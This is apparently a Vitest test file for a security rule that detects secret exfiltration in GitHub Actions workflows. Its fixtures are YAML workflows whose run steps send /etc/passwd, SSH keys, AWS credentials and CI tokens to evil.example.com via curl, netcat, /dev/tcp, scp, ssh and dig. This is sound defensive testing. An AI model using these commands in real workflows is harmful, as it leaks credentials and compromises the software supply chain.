import { describe, it } from 'vitest';
import { expectRuleMatch, expectRuleDidNotMatch, expectRuleMetadata } from '../helpers.js';

const RULE = 'supply_chain_github_workflow_exfil';

describe(RULE, () => {
  describe('positive cases – should match', () => {
    it('matches /dev/tcp channel in a run step', async () => {
      await expectRuleMatch(
        `name: ci
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: cat /etc/passwd > /dev/tcp/evil.example.com/4444
`,
        RULE,
      );
    });

    it('matches base64 piped to curl in a run step', async () => {
      await expectRuleMatch(
        `name: ci
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: cat secrets.txt | base64 | curl -d @- https://evil.example.com
`,
        RULE,
      );
    });

    it('matches cat ~/.aws/credentials piped to curl', async () => {
      await expectRuleMatch(
        `name: ci
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: cat ~/.aws/credentials | curl -d @- https://evil.example.com
`,
        RULE,
      );
    });

    it('matches scp of an SSH private key', async () => {
      await expectRuleMatch(
        `name: ci
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: scp ~/.ssh/id_rsa attacker@evil.example.com:~/
`,
        RULE,
      );
    });

    it('matches DNS-based exfil via dig', async () => {
      await expectRuleMatch(
        `name: ci
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: dig $API_SECRET.evil.example.com
`,
        RULE,
      );
    });

    it('matches gh gist create', async () => {
      await expectRuleMatch(
        `name: ci
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "$SECRET" | gh gist create -
`,
        RULE,
      );
    });

    it('matches a GitHub secret piped to netcat', async () => {
      await expectRuleMatch(
        `name: ci
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo \${{ secrets.ANTHROPIC_TOKEN }} | nc evil.example.com 4444
`,
        RULE,
      );
    });

    it('matches a GitHub secret uploaded via curl -F', async () => {
      await expectRuleMatch(
        `name: ci
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo \${{ secrets.NPM_TOKEN }} | curl -F "token=@-" https://evil.example.com
`,
        RULE,
      );
    });

    it('matches PostHog personal key shipped via curl', async () => {
      await expectRuleMatch(
        `name: ci
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -H "X-Key: phx_1111111111222222222233333333334444" https://evil.example.com
`,
        RULE,
      );
    });

    it('matches an env-var secret piped into netcat', async () => {
      await expectRuleMatch(
        `name: ci
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo $GITHUB_TOKEN | nc evil.example.com 4444
`,
        RULE,
      );
    });

    it('matches ssh running a remote command with a secret', async () => {
      await expectRuleMatch(
        `name: ci
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: ssh user@evil.example.com "echo $DATABASE_PASSWORD > /tmp/loot"
`,
        RULE,
      );
    });

    it('matches exfil inside a multi-line block scalar run step', async () => {
      await expectRuleMatch(
        `name: ci
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: |
          set -e
          cat ~/.ssh/id_rsa | base64 | curl -d @- https://evil.example.com
`,
        RULE,
      );
    });
  });

  describe('negative cases – should NOT match', () => {
    it('does NOT match a workflow using a secret in a normal auth header', async () => {
      await expectRuleDidNotMatch(
        `name: ci
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: curl -H "Authorization: Bearer \${{ secrets.NPM_TOKEN }}" https://registry.npmjs.org/
`,
        RULE,
      );
    });

    it('does NOT match a checkout + build workflow', async () => {
      await expectRuleDidNotMatch(
        `name: ci
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pnpm install
      - run: pnpm build
`,
        RULE,
      );
    });

    it('does NOT match gh release upload', async () => {
      await expectRuleDidNotMatch(
        `name: release
on: push
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - run: gh release upload v1.0.0 dist/app.tar.gz
`,
        RULE,
      );
    });

    it('does NOT match gh api reading repo data', async () => {
      await expectRuleDidNotMatch(
        `name: ci
on: push
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - run: gh api repos/posthog/posthog/pulls
`,
        RULE,
      );
    });

    it('does NOT match a YAML file without a jobs block', async () => {
      await expectRuleDidNotMatch(
        `version: "3"
services:
  app:
    image: node:20
    command: node -e "fetch('https://evil.example.com?x='+process.env.JWT_SECRET)"
`,
        RULE,
      );
    });

    it('does NOT match unrelated prose that mentions workflow terms', async () => {
      await expectRuleDidNotMatch(
        `We use GitHub Actions for our CI. The jobs: block contains our build steps.`,
        RULE,
      );
    });
  });

  describe('metadata', () => {
    it('exposes all required metadata fields on a match', async () => {
      await expectRuleMetadata(
        `name: ci
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: cat /etc/passwd > /dev/tcp/evil.example.com/4444
`,
        RULE,
        { severity: 'critical', category: 'supply_chain', action: 'block' },
      );
    });
  });
});
